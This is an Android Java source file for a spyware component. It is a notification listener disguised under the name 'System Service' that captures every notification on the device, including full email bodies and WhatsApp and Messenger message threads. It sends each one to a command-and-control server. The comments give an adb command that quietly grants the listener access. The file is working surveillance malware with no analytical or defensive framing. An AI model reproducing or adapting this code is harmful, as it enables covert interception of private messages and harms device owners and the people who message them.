package com.system.service;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

/**
 * Captures every notification posted on the device.
 * Activation: Settings → Notifications → Notification access → enable "System Service"
 * OR: adb shell cmd notification allow_listener com.system.service/.NotifListener
 *
 * Data sent to C2 per notification:
 *   PKG  | APP  | TITLE  | TEXT  | SUBTEXT  | TICKER  | TIME
 */
public class NotifListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification notif   = sbn.getNotification();
            Bundle       extras  = notif.extras;

            String pkg      = sbn.getPackageName();
            String title    = extras.getCharSequence(Notification.EXTRA_TITLE,    "").toString();
            String text     = extras.getCharSequence(Notification.EXTRA_TEXT,     "").toString();
            String subtext  = extras.getCharSequence(Notification.EXTRA_SUB_TEXT, "").toString();
            String ticker   = notif.tickerText != null ? notif.tickerText.toString() : "";
            long   time     = sbn.getPostTime();

            // Extra: big text (WhatsApp, Gmail full body)
            CharSequence big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            if (big != null && !big.toString().isEmpty()) text = big.toString();

            // Extra: messages array (WhatsApp group chats, Messenger)
            Notification.MessagingStyle.Message[] msgs =
                Notification.MessagingStyle.Message.getMessagesFromBundleArray(
                    extras.getParcelableArray(Notification.EXTRA_MESSAGES));
            if (msgs != null && msgs.length > 0) {
                StringBuilder sb = new StringBuilder();
                for (Notification.MessagingStyle.Message m : msgs) {
                    sb.append(m.getSender() != null ? m.getSender().getName() : "?")
                      .append(": ").append(m.getText()).append(" | ");
                }
                text = sb.toString();
            }

            String payload = "[NOTIF]"
                + " pkg="   + pkg
                + " title=" + sanitize(title)
                + " text="  + sanitize(text)
                + " sub="   + sanitize(subtext)
                + " tick="  + sanitize(ticker)
                + " time="  + time;

            C2Sender.send(payload);

        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // optional: track dismissals
    }

    // Strip newlines so each notification is one line on the C2 side
    private String sanitize(String s) {
        return s.replace("\n", " ").replace("\r", "").trim();
    }
}
